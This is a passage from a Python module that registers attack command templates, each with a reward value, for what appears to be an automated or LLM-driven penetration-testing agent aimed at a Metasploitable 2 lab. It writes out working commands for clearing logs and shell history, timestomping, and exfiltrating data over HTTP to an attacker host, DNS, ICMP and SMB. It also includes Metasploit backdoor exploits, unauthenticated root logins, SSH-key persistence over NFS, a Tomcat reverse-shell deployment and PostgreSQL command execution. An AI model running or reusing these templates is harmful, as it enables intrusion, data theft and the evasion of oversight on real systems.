    name="cleanup_logs",
    template="echo '' > /var/log/auth.log && echo '' > /var/log/syslog && history -c",
    description="Clear system logs and bash history to cover tracks.",
    phase=AttackPhase.POST_EXPLOITATION,
    required_params=[],
    preconditions={"root_shell_obtained"},
    success_indicators=[""],
    typical_reward=5.0,
    tags={"post", "cleanup", "antiforensics"}
))

register(CommandTemplate(
    name="timestomp",
    template="touch -r /etc/hosts {file}",
    description="Modify file timestamps to match reference file (anti-forensics).",
    phase=AttackPhase.POST_EXPLOITATION,
    required_params=["file"],
    preconditions={"shell_obtained"},
    success_indicators=[""],
    typical_reward=3.0,
    tags={"post", "antiforensics", "timestomp"}
))

# --- Exfiltration (expanded) ---
register(CommandTemplate(
    name="exfil_data",
    template="tar czf /tmp/.data.tar.gz {path} && curl -X POST -F 'file=@/tmp/.data.tar.gz' http://{attacker}:{port}/upload",
    description="Archive and exfiltrate target data via HTTP POST.",
    phase=AttackPhase.EXFILTRATION,
    required_params=["path", "attacker", "port"],
    optional_params={"path": "/etc/", "attacker": "10.10.14.1", "port": "8888"},
    preconditions={"shell_obtained"},
    success_indicators=["100%", "uploaded"],
    typical_reward=8.0,
    tags={"exfil", "http", "archive"}
))

register(CommandTemplate(
    name="dns_exfil",
    template="for line in $(base64 {file} | fold -w 60); do dig $line.{domain} @{dns_server}; done",
    description="Exfiltrate data via DNS queries (stealthy).",
    phase=AttackPhase.EXFILTRATION,
    required_params=["file", "domain", "dns_server"],
    preconditions={"shell_obtained"},
    success_indicators=["NOERROR"],
    typical_reward=6.0,
    tags={"exfil", "dns", "stealth"}
))

register(CommandTemplate(
    name="icmp_exfil",
    template="xxd -p {file} | while read line; do ping -c 1 -p $line {attacker}; done",
    description="Exfiltrate data via ICMP ping payloads (very stealthy).",
    phase=AttackPhase.EXFILTRATION,
    required_params=["file", "attacker"],
    preconditions={"shell_obtained"},
    success_indicators=["bytes from"],
    typical_reward=5.0,
    tags={"exfil", "icmp", "stealth"}
))

register(CommandTemplate(
    name="base64_exfil",
    template="base64 {file} | xclip -selection clipboard",
    description="Base64 encode file for manual exfiltration via clipboard.",
    phase=AttackPhase.EXFILTRATION,
    required_params=["file"],
    preconditions={"shell_obtained"},
    success_indicators=[""],
    typical_reward=3.0,
    tags={"exfil", "base64", "manual"}
))

register(CommandTemplate(
    name="smb_exfil",
    template="smbclient //{attacker}/share -N -c 'put {file}'",
    description="Exfiltrate file to attacker SMB share.",
    phase=AttackPhase.EXFILTRATION,
    required_params=["attacker", "file"],
    preconditions={"shell_obtained"},
    success_indicators=["putting file"],
    typical_reward=5.0,
    tags={"exfil", "smb"}
))


# =============================================================================
# PHASE 3 ADDITIONS — Missing Playbook-Referenced Commands
# =============================================================================

# --- Stealth Recon Commands ---
register(CommandTemplate(
    name="nmap_stealth_scan",
    template="nmap -sS -T2 --max-retries 1 -Pn {target}",
    description="SYN stealth scan — avoids completing TCP handshake for lower detection.",
    phase=AttackPhase.RECON,
    required_params=["target"],
    success_indicators=["open", "Host is up"],
    typical_reward=3.0,
    tags={"recon", "stealth", "nmap"},
    why="Discovers open ports with minimal detection risk",
    when="Initial recon when blue team is active or stealth is needed",
    not_when="Speed is priority and detection is not a concern",
))

register(CommandTemplate(
    name="nmap_comprehensive",
    template="nmap -sC -sV -O -A --top-ports 1000 -T4 {target}",
    description="Comprehensive nmap scan with scripts, versions, and OS detection.",
    phase=AttackPhase.RECON,
    required_params=["target"],
    success_indicators=["open", "Host is up", "Service Info"],
    typical_reward=5.0,
    tags={"recon", "nmap", "thorough"},
    why="Single scan that provides port, service, version, and OS data",
    when="When thorough discovery is needed and stealth is not critical",
))

register(CommandTemplate(
    name="dns_enum",
    template="dnsenum --enum {target}",
    description="DNS enumeration including zone transfer attempts and subdomain brute force.",
    phase=AttackPhase.RECON,
    required_params=["target"],
    success_indicators=["Name Servers", "Zone Transfer", "found"],
    typical_reward=3.0,
    tags={"recon", "dns", "enumeration"},
    why="Discovers subdomains, mail servers, and zone transfer misconfigurations",
    when="Target has DNS service or when mapping network topology",
))

register(CommandTemplate(
    name="whois_lookup",
    template="whois {target}",
    description="WHOIS lookup for domain registration and contact information.",
    phase=AttackPhase.RECON,
    required_params=["target"],
    success_indicators=["Registrant", "Name Server", "Creation Date"],
    typical_reward=2.0,
    tags={"recon", "osint", "passive"},
    why="Passive reconnaissance — no direct target interaction",
    when="Early recon phase to map organization and infrastructure",
))

# --- Alias for enum4linux used by SMB playbook ---
register(CommandTemplate(
    name="enum4linux_scan",
    template="enum4linux -a {target}",
    description="Comprehensive SMB/RPC enumeration (alias for enum4linux_full).",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    preconditions={"ports_discovered"},
    success_indicators=["Users", "Shares", "Password Policy"],
    typical_reward=6.0,
    tags={"smb", "enumeration", "rpc"},
    why="Enumerates users, shares, groups, and password policy over SMB/RPC",
    when="SMB ports (139/445) found open during recon",
))


# =============================================================================
# METASPLOITABLE 2 — SPECIFIC ATTACK COMMANDS
# =============================================================================

# --- MS2 Targeted Port Scans ---
register(CommandTemplate(
    name="nmap_port_21",
    template="nmap -sV -p 21 {target}",
    description="Scan FTP port for vsftpd version detection on MS2.",
    phase=AttackPhase.RECON,
    required_params=["target"],
    success_indicators=["vsftpd", "21/tcp", "open"],
    typical_reward=3.0,
    tags={"recon", "ftp", "ms2"},
    why="Detects vsftpd 2.3.4 which has a known backdoor",
    when="Initial reconnaissance of FTP service",
))

register(CommandTemplate(
    name="nmap_port_6667",
    template="nmap -sV -p 6667 {target}",
    description="Scan IRC port for UnrealIRCd on MS2.",
    phase=AttackPhase.RECON,
    required_params=["target"],
    success_indicators=["UnrealIRCd", "6667/tcp", "open", "irc"],
    typical_reward=3.0,
    tags={"recon", "irc", "ms2"},
    why="Detects UnrealIRCd 3.2.8.1 which has a known backdoor",
    when="Initial reconnaissance of IRC service",
))

register(CommandTemplate(
    name="nmap_port_1524",
    template="nmap -sV -p 1524 {target}",
    description="Scan for ingreslock backdoor shell on port 1524.",
    phase=AttackPhase.RECON,
    required_params=["target"],
    success_indicators=["1524/tcp", "open", "bindshell", "ingreslock"],
    typical_reward=3.0,
    tags={"recon", "backdoor", "ms2"},
    why="Port 1524 is an open backdoor shell on MS2 — instant root",
    when="Scanning for low-hanging fruit backdoors",
))

register(CommandTemplate(
    name="nmap_port_8180",
    template="nmap -sV -p 8180 {target}",
    description="Scan for Apache Tomcat on port 8180.",
    phase=AttackPhase.RECON,
    required_params=["target"],
    success_indicators=["8180/tcp", "open", "Tomcat", "http"],
    typical_reward=3.0,
    tags={"recon", "web", "ms2"},
    why="Detects Tomcat with default credentials on MS2",
    when="Scanning for web application servers",
))

register(CommandTemplate(
    name="nmap_port_5432",
    template="nmap -sV -p 5432 {target}",
    description="Scan for PostgreSQL on port 5432.",
    phase=AttackPhase.RECON,
    required_params=["target"],
    success_indicators=["5432/tcp", "open", "PostgreSQL", "postgresql"],
    typical_reward=3.0,
    tags={"recon", "db", "ms2"},
    why="Detects PostgreSQL with default postgres:postgres creds on MS2",
    when="Scanning for database services",
))

register(CommandTemplate(
    name="nmap_rservices",
    template="nmap -sV -p 512,513,514 {target}",
    description="Scan for r-services (rexec, rlogin, rsh) on ports 512-514.",
    phase=AttackPhase.RECON,
    required_params=["target"],
    success_indicators=["512/tcp", "513/tcp", "514/tcp", "open", "exec", "login", "shell"],
    typical_reward=3.0,
    tags={"recon", "rservices", "ms2"},
    why="R-services on MS2 allow unauthenticated remote access as root",
    when="Scanning for legacy services with no authentication",
))

# --- MS2 Exploitation Commands ---
register(CommandTemplate(
    name="vsftpd_exploit",
    template="msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; exploit'",
    description="Exploit vsftpd 2.3.4 backdoor for root shell.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target"],
    preconditions={"ports_discovered"},
    success_indicators=["shell session", "uid=0", "root", "Backdoor"],
    typical_reward=50.0,
    tags={"exploit", "ftp", "backdoor", "ms2"},
    why="vsftpd 2.3.4 has a backdoor triggered by :) in USER field — gives root",
    when="vsftpd 2.3.4 detected on port 21",
))

register(CommandTemplate(
    name="unrealircd_exploit",
    template="msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS {target}; exploit'",
    description="Exploit UnrealIRCd 3.2.8.1 backdoor for root shell.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target"],
    preconditions={"ports_discovered"},
    success_indicators=["shell session", "uid=0", "root", "Backdoor"],
    typical_reward=50.0,
    tags={"exploit", "irc", "backdoor", "ms2"},
    why="UnrealIRCd 3.2.8.1 has a backdoor that gives root shell",
    when="UnrealIRCd detected on port 6667",
))

register(CommandTemplate(
    name="telnet_1524",
    template="telnet {target} 1524",
    description="Connect to ingreslock backdoor on port 1524 for instant root.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target"],
    preconditions={"ports_discovered"},
    success_indicators=["root", "uid=0", "Connected"],
    typical_reward=60.0,
    tags={"exploit", "backdoor", "instant", "ms2"},
    why="Port 1524 is a pre-existing backdoor on MS2 — instant root shell",
    when="Port 1524 found open during recon",
))

register(CommandTemplate(
    name="root_shell_confirm",
    template="id",
    description="Confirm root access by checking uid.",
    phase=AttackPhase.EXPLOITATION,
    required_params=[],
    preconditions={"shell_obtained"},
    success_indicators=["uid=0", "root"],
    typical_reward=10.0,
    tags={"post-exploit", "verification"},
    why="Confirms root access after successful exploitation",
    when="After obtaining a shell via any exploit",
))

register(CommandTemplate(
    name="rsh_root",
    template="rsh -l root {target} id",
    description="Use rsh for unauthenticated root command execution.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target"],
    preconditions={"ports_discovered"},
    success_indicators=["uid=0", "root"],
    typical_reward=40.0,
    tags={"exploit", "rservices", "ms2"},
    why="R-services on MS2 have no authentication — direct root access",
    when="Port 514 (rsh) found open",
))

register(CommandTemplate(
    name="rlogin_root",
    template="rlogin -l root {target}",
    description="Use rlogin for unauthenticated root login.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target"],
    preconditions={"ports_discovered"},
    success_indicators=["root@", "uid=0", "Last login"],
    typical_reward=20.0,
    tags={"exploit", "rservices", "ms2"},
    why="R-login on MS2 allows root login without password",
    when="Port 513 (rlogin) found open",
))

# --- MS2 NFS + Persistence ---
register(CommandTemplate(
    name="rpcinfo_check",
    template="rpcinfo -p {target}",
    description="Check RPC services to find NFS and mountd.",
    phase=AttackPhase.RECON,
    required_params=["target"],
    success_indicators=["nfs", "mountd", "portmapper", "2049"],
    typical_reward=5.0,
    tags={"recon", "nfs", "rpc", "ms2"},
    why="Discovers NFS service availability for mounting remote filesystems",
    when="Looking for NFS shares on target",
))

register(CommandTemplate(
    name="showmount_enum",
    template="showmount -e {target}",
    description="Show exported NFS shares.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    preconditions={"ports_discovered"},
    success_indicators=["Export list", "/"],
    typical_reward=10.0,
    tags={"enum", "nfs", "ms2"},
    why="NFS on MS2 exports / (root) to everyone — can mount full filesystem",
    when="NFS (port 2049) detected during recon",
))

register(CommandTemplate(
    name="nfs_mount",
    template="mount -t nfs {target}:/ /tmp/nfs_mount",
    description="Mount NFS root share to access target filesystem.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target"],
    preconditions={"ports_discovered"},
    success_indicators=["mounted", "mount"],
    typical_reward=25.0,
    tags={"exploit", "nfs", "ms2"},
    why="Mounts the entire target filesystem for reading/writing",
    when="NFS export of / found via showmount",
))

register(CommandTemplate(
    name="ssh_key_plant",
    template="cp /root/.ssh/id_rsa.pub /tmp/nfs_mount/root/.ssh/authorized_keys",
    description="Plant SSH public key via NFS for persistent root access.",
    phase=AttackPhase.PRIVILEGE_ESCALATION,
    required_params=[],
    preconditions={"shell_obtained"},
    success_indicators=["success", "copied"],
    typical_reward=30.0,
    tags={"privesc", "persistence", "nfs", "ms2"},
    why="Plants SSH key via NFS mount for persistent passwordless root access",
    when="NFS root share mounted successfully",
))

# --- MS2 Tomcat Manager ---
register(CommandTemplate(
    name="tomcat_cred_test",
    template="curl -s http://{target}:8180/manager/html --user tomcat:tomcat",
    description="Test default Tomcat credentials on port 8180.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    preconditions={"ports_discovered"},
    success_indicators=["Tomcat", "Manager", "200", "Deploy"],
    typical_reward=15.0,
    tags={"enum", "web", "creds", "ms2"},
    why="Tomcat on MS2 has default tomcat:tomcat credentials on /manager",
    when="Tomcat detected on port 8180",
))

register(CommandTemplate(
    name="war_deploy",
    template="msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_deploy; set RHOSTS {target}; set RPORT 8180; set HttpUsername tomcat; set HttpPassword tomcat; exploit'",
    description="Deploy WAR reverse shell via Tomcat manager.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target"],
    preconditions={"ports_discovered"},
    success_indicators=["shell session", "Meterpreter", "uid="],
    typical_reward=35.0,
    tags={"exploit", "web", "ms2"},
    why="Deploys malicious WAR file via Tomcat manager for shell access",
    when="Tomcat manager accessible with default creds",
))

# --- MS2 PostgreSQL RCE ---
register(CommandTemplate(
    name="psql_default_creds",
    template="psql -h {target} -U postgres -c '\\l'",
    description="Connect to PostgreSQL with default postgres:postgres creds.",
    phase=AttackPhase.ENUMERATION,
    required_params=["target"],
    preconditions={"ports_discovered"},
    success_indicators=["List of databases", "template", "postgres"],
    typical_reward=15.0,
    tags={"enum", "db", "creds", "ms2"},
    why="PostgreSQL on MS2 has default postgres:postgres credentials",
    when="PostgreSQL detected on port 5432",
))

register(CommandTemplate(
    name="psql_rce",
    template="psql -h {target} -U postgres -c \"COPY (SELECT '') TO PROGRAM 'id'\"",
    description="Execute OS commands via PostgreSQL COPY ... TO PROGRAM.",
    phase=AttackPhase.EXPLOITATION,
    required_params=["target"],
    preconditions={"ports_discovered"},
    success_indicators=["uid=", "root", "postgres"],
    typical_reward=35.0,
    tags={"exploit", "db", "rce", "ms2"},
    why="PostgreSQL COPY TO PROGRAM allows arbitrary OS command execution",
    when="PostgreSQL access confirmed with default creds",
))


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def get_commands_for_phase(phase: AttackPhase) -> List[CommandTemplate]:
    """Get all commands for a specific attack phase."""
    return [cmd for cmd in COMMAND_REGISTRY.values() if cmd.phase == phase]


def get_valid_commands_for_state(
    state: Dict[str, Any],
    phase: Optional[AttackPhase] = None
) -> List[CommandTemplate]:
    """
    Get commands whose preconditions are satisfied by current state.
    
    Args:
        state: Dictionary of state flags (e.g., {"http_service_found": True})
        phase: Optional filter for specific phase
        
    Returns:
        List of valid CommandTemplates
    """
    valid_commands = []
    state_flags = set(k for k, v in state.items() if v)
    
    for cmd in COMMAND_REGISTRY.values():
        # Filter by phase if specified
        if phase and cmd.phase != phase:
            continue
        
        # Check if all preconditions are met
        if cmd.preconditions.issubset(state_flags):
            valid_commands.append(cmd)
    
    return valid_commands


def render_command(template: CommandTemplate, params: Dict[str, str]) -> str:
    """
    Render a command template with provided parameters.
    
    Args:
        template: The CommandTemplate to render
        params: Dictionary of parameter values
        
    Returns:
        The rendered command string
        
    Raises:
        ValueError: If required parameters are missing
    """
    # Check required params
    missing = set(template.required_params) - set(params.keys())
    if missing:
        raise ValueError(f"Missing required parameters: {missing}")
    
    # Merge with optional defaults
    all_params = {**template.optional_params, **params}
    
    # Render template
    try:
        return template.template.format(**all_params)
    except KeyError as e:
        raise ValueError(f"Missing parameter in template: {e}")


def get_phase_from_state(state: Dict[str, Any]) -> AttackPhase:
    """
    Determine current attack phase based on state flags.
    
    Phase 6.4: Discovery-gated — requires CUMULATIVE evidence to advance.
    Each phase requires ALL prior phase conditions to be met too,
    preventing trivial jumps (e.g., one flag → POST_EXPLOITATION).
    
    Args:
        state: Dictionary of state flags
        
    Returns:
        Current AttackPhase
    """
    # Count service-related flags for ENUMERATION gate
    service_flags = sum(
        1 for svc in ["http", "smb", "ssh", "ftp", "ldap", "dns", "snmp", "nfs", "winrm", "kerberos"]
        if state.get(f"{svc}_service_found")
    )
    has_enumeration = service_flags >= 2 or state.get("services_enumerated")
    
    # ENUMERATION requires finding ≥2 different services
    if not has_enumeration:
        return AttackPhase.RECON
    
    # EXPLOITATION requires credentials OR confirmed vulnerability, AND enumeration
    has_exploitation = (
        state.get("credentials_known")
        or state.get("sqli_confirmed")
        or (state.get("vulnerability_found") and state.get("services_enumerated"))
    )
    if not has_exploitation:
        return AttackPhase.ENUMERATION
    
    # PRIVILEGE_ESCALATION requires shell obtained (not just credentials)
    has_shell = (
        state.get("shell_obtained")
        or state.get("linux_shell_obtained")
        or state.get("windows_shell_obtained")
    )
    if not has_shell:
        return AttackPhase.EXPLOITATION
    
    # LATERAL_MOVEMENT requires shell + lateral evidence
    has_lateral = (
        state.get("lateral_target_found")
        or state.get("hash_known")
    )
    if not has_lateral:
        return AttackPhase.PRIVILEGE_ESCALATION
    
    # POST_EXPLOITATION requires admin access + shell
    has_post = (
        state.get("admin_access_obtained")
        or state.get("domain_admin_obtained")
        or state.get("root_shell_obtained")
    )
    if not has_post:
        return AttackPhase.LATERAL_MOVEMENT
    
    # EXFILTRATION requires actual data exfiltration OR persistence
    has_exfil = (
        state.get("data_exfiltrated")
        or state.get("persistence_established")
    )
    if not has_exfil:
        return AttackPhase.POST_EXPLOITATION
    
    return AttackPhase.EXFILTRATION


def get_commands_by_tag(tag: str) -> List[CommandTemplate]:
    """Get all commands with a specific tag."""
    return [cmd for cmd in COMMAND_REGISTRY.values() if tag in cmd.tags]


def get_command_names_for_prompt(
    state: Dict[str, Any],
    phase: Optional[AttackPhase] = None,
    limit: int = 20
) -> List[str]:
    """
    Get command names suitable for including in LLM prompts.
    
    Args:
        state: Current state flags
        phase: Optional phase filter
        limit: Maximum number to return
        
    Returns:
        List of command names with brief descriptions
    """
    valid = get_valid_commands_for_state(state, phase)
    
    # Sort by typical_reward descending
    valid.sort(key=lambda c: c.typical_reward, reverse=True)
    
    result = []
    for cmd in valid[:limit]:
        params_str = ", ".join(cmd.required_params) if cmd.required_params else "none"
        result.append(f"{cmd.name} (params: {params_str}) - {cmd.description[:60]}...")
    
    return result


# =============================================================================
# COMMAND REGISTRY STATS
# =============================================================================

def get_registry_stats() -> Dict[str, int]:
    """Get statistics about the command registry."""
    stats = {
        "total_commands": len(COMMAND_REGISTRY),
    }
    
    for phase in AttackPhase:
        stats[phase.name.lower()] = len(get_commands_for_phase(phase))
    
    return stats


# Print stats when module loads (for debugging)
if __name__ == "__main__":
    stats = get_registry_stats()
    print(f"Command Registry loaded with {stats['total_commands']} commands:")
    for phase in AttackPhase:
        print(f"  {phase.name}: {stats[phase.name.lower()]} commands")
